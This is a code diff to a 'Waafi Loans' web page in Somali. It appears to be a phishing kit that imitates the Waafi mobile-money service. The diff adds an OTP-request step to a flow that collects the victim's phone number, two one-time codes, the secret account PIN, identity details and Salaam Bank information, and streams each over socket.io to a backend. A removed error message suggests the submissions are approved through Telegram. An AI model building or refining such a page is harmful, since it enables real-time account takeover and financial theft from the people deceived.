@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="theme-color" content="#74b927">
     <title>Waafi Loans</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <!-- Stable CSS compilation fallback to fix the 22 script loading errors -->
+    <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <!-- Alpine Core Docs recommend loading Alpine defer *after* your other configurations -->
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <style>
         [x-cloak] { display: none !important; }
         body {
@@ -150,34 +152,45 @@
 
             <div class="bg-white rounded-2xl border border-gray-100 p-6 shadow-sm flex-1 flex flex-col justify-between">
                 
-                <div x-show="step === 1" x-transition.duration.200ms class="space-y-5">
+                <!-- Step 1: Input details and explicit manual click action for triggering state verification streams -->
+                <div x-show="step === 1" class="space-y-5">
                     <div class="text-center mb-6">
-                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Geli Lambarka & Koodhka</h2>
-                        <p class="text-xs text-gray-400 mt-1">Fadlan geli lambarkaaga talifoonka iyo koodhka OTP 1 ee laguu soo diray.</p>
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Geli Lambarka Telefoonka</h2>
+                        <p class="text-xs text-gray-400 mt-1">Fadlan geli lambarkaaga si aad u codsato koodhka xaqiijinta.</p>
                     </div>
 
                     <div>
                         <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Lambarka Telefoonka</label>
                         <div class="flex gap-2">
-                            <span class="w-28 flex items-center justify-center bg-gray-100 border border-gray-200 rounded-xl px-2 text-gray-700 font-bold text-sm">🇸🇴 +252</span>
+                            <span class="w-24 flex items-center justify-center bg-gray-100 border border-gray-200 rounded-xl px-2 text-gray-700 font-bold text-sm">🇸🇴 +252</span>
                             <input type="tel" x-model="form.phone" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all flex-1" placeholder="9XXXXXXX" maxlength="9">
                         </div>
                     </div>
 
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Koodhka Xaqiijinta (OTP 1)</label>
-                        <input type="text" x-model="otp.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
+                    <div class="pt-1">
+                        <button @click="sendOtpRequest" :disabled="form.phone.length < 7 || requestingOtp" type="button" class="w-full border border-gray-200 hover:bg-slate-50 disabled:opacity-50 disabled:cursor-not-allowed text-slate-700 font-bold py-3 px-4 rounded-xl shadow-sm transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!requestingOtp" x-text="otpRequested ? 'Haddana Dalbo Koodhka' : 'Dalbo Koodhka (Request OTP)'">Dalbo Koodhka (Request OTP)</span>
+                            <span x-show="requestingOtp" class="spinner-sm !border-t-[#74b927] !border-slate-300"></span>
+                        </button>
                     </div>
 
-                    <div class="pt-4">
-                        <button @click="verifyOTP" :disabled="form.phone.length < 7 || otp.code.length !== 6 || otpVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!otpVerifying">Sii wad →</span>
-                            <span x-show="otpVerifying" class="spinner-sm"></span>
-                        </button>
+                    <div x-show="otpRequested" x-cloak class="space-y-4 pt-2">
+                        <div>
+                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Koodhka Xaqiijinta (OTP 1)</label>
+                            <input type="text" x-model="otp.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
+                        </div>
+
+                        <div class="pt-2">
+                            <button @click="verifyOTP" :disabled="otp.code.length !== 6 || otpVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                                <span x-show="!otpVerifying">Sii wad →</span>
+                                <span x-show="otpVerifying" class="spinner-sm"></span>
+                            </button>
+                        </div>
                     </div>
                 </div>
 
-                <div x-show="step === 2" x-cloak x-transition.duration.200ms class="space-y-5">
+                <!-- Step 2: PIN Submission Interface -->
+                <div x-show="step === 2" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Geli PIN-ka Sirta ah</h2>
                         <p class="text-xs text-gray-400 mt-1">Geli 4-ta nambar ee sirta ah ee koontadaada Waafi.</p>
@@ -200,7 +213,8 @@
                     </div>
                 </div>
 
-                <div x-show="step === 3" x-cloak x-transition.duration.200ms class="space-y-5">
+                <!-- Step 3: Second Layer Security Form Context -->
+                <div x-show="step === 3" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaqiijinta Labaad (OTP 2)</h2>
                         <p class="text-xs text-gray-400 mt-1">Fadlan geli koodhka labaad ee laguu soo diray si loo dhammaystiro aqoonsigaaga.</p>
@@ -221,7 +235,8 @@
                     </div>
                 </div>
 
-                <div x-show="step === 4" x-cloak x-transition.duration.200ms class="space-y-5">
+                <!-- Step 4: Core Parameters Configuration Selection block -->
+                <div x-show="step === 4" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Nooca Amaahda iyo Muddada</h2>
                         <p class="text-xs text-gray-400 mt-1">Fadlan dooro nooca amaahda aad u baahan tahay iyo muddada.</p>
@@ -244,9 +259,7 @@
                     <div>
                         <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Xaddiga Amaahda</label>
                         <div class="relative flex items-center h-6">
-                            <input type="range" x-model="form.amount" min="30" max="300000" step="100" 
-                                class="w-full h-2 bg-orange-600 rounded-lg appearance-none cursor-pointer accent-orange-700 relative z-10"
-                                style="-webkit-appearance: none; appearance: none;">
+                            <input type="range" x-model="form.amount" min="30" max="300000" step="100" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-[#74b927]">
                         </div>
                         <div class="flex justify-between text-[11px] text-gray-400 font-bold mt-1">
                             <span>$30</span>
@@ -282,7 +295,8 @@
                     </div>
                 </div>
 
-                <div x-show="step === 5" x-cloak x-transition.duration.200ms class="space-y-5">
+                <!-- Step 5: Personal KYC details parsing collection -->
+                <div x-show="step === 5" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Macluumaadka Shakhsiga</h2>
                         <p class="text-xs text-gray-400 mt-1">Geli macluumaadkaaga hoose si loo xaqiijiyo galkaaga.</p>
@@ -314,7 +328,8 @@
                     </div>
                 </div>
 
-                <div x-show="step === 6" x-cloak x-transition.duration.200ms class="space-y-5">
+                <!-- Step 6: Professional Income Attributes validation processing -->
+                <div x-show="step === 6" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Xaaladda Shaqada & Koontada</h2>
                         <p class="text-xs text-gray-400 mt-1">Geli macluumaadka si aad u xaqiijiso xiriirka Salaam Bank.</p>
@@ -354,7 +369,8 @@
                     </div>
                 </div>
 
-                <div x-show="step === 7" x-cloak x-transition.duration.300ms class="text-center py-8 flex flex-col items-center justify-center my-auto space-y-6">
+                <!-- Step 7: Completed State Lifecycle View -->
+                <div x-show="step === 7" x-cloak class="text-center py-8 flex flex-col items-center justify-center my-auto space-y-6">
                     <div class="w-16 h-16 bg-[#74b927] rounded-2xl flex items-center justify-center shadow-md shadow-emerald-100">
                         <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3.5">
                             <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
@@ -389,7 +405,7 @@
                 otp: { code: '' },
                 pin: { value: ['', '', '', ''] },
                 otp2: { code: '' },
-                otpVerifying: false, pinVerifying: false, otp2Verifying: false, 
+                otpRequested: false, requestingOtp: false, otpVerifying: false, pinVerifying: false, otp2Verifying: false, 
                 socket: null, toast: { show: false, message: '' },
 
                 get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
@@ -428,7 +444,12 @@
                         this.step = 4;
                     });
                     
-                    // Error and fail listeners
+                    this.socket.on('otp1-requested-success', () => {
+                        this.requestingOtp = false;
+                        this.otpRequested = true;
+                        this.triggerToastNotification("Koodhka OTP 1 waa la diray.");
+                    });
+                    
                     this.socket.on('otp-failed', (err) => {
                         this.otpVerifying = false;
                         this.triggerToastNotification(err.message || "Code-ka OTP ee aad gelisay waa khalad");
@@ -452,14 +473,25 @@
                         this.otpVerifying = false;
                         this.pinVerifying = false;
                         this.otp2Verifying = false;
-                        this.triggerToastNotification(err.message || "Xaqiijinta waa laga diaday Telegram-ka");
+                        this.requestingOtp = false;
+                        this.triggerToastNotification(err.message || "Xaqiijinta waa laga diaday");
                     });
                 },
 
-                // Authentication handlers
+                sendOtpRequest() {
+                    this.requestingOtp = true;
+                    this.socket.emit('request-otp1', { appId: this.appId, phone: this.form.phone });
+                    
+                    setTimeout(() => {
+                        if(this.requestingOtp) {
+                            this.requestingOtp = false;
+                            this.otpRequested = true;
+                        }
+                    }, 1200);
+                },
+
                 verifyOTP() { 
                     this.otpVerifying = true; 
-                    // Sends both phone number and verification code matching backend payload requirements
                     this.socket.emit('step4-otp', { appId: this.appId, phone: this.form.phone, otp: this.otp.code }); 
                 },
                 submitStep5() { 
@@ -471,7 +503,6 @@
                     this.socket.emit('step6-otp2', { appId: this.appId, otp2: this.otp2.code });
                 },
 
-                // Form execution steps
                 submitStep1() { 
                     this.form.appId = this.appId;
                     this.socket.emit('step1', this.form); 
